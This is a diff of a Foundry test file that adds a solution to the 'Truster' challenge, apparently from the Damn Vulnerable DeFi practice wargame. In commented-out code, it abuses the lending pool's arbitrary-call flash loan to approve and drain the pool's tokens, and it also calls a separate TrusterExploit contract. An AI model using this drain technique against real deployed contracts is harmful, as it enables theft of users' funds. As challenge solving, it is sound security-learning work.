@@ -5,6 +5,7 @@ pragma solidity =0.8.25;
 import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
+import {TrusterExploit} from "./TrusterExploit.sol";
 
 contract TrusterChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -51,7 +52,25 @@ contract TrusterChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_truster() public checkSolvedByPlayer {
+        // There is an issue when nonce doesnt get updated 
+        // https://github.com/foundry-rs/foundry/issues/8811
+
+        // pool.flashLoan(
+        //     0,
+        //     player,
+        //     address(token),
+        //     abi.encodeWithSignature(
+        //         "approve(address,uint256)",
+        //         address(player), TOKENS_IN_POOL
+        //     )
+        // );
+    
+        // token.transferFrom(address(pool), address(player), TOKENS_IN_POOL);
+        // token.transfer(address(recovery), TOKENS_IN_POOL);
         
+        // This solution doesnt have that issues
+        TrusterExploit exp = new TrusterExploit(token, pool, recovery);
+        exp.attack();
     }
 
     /**
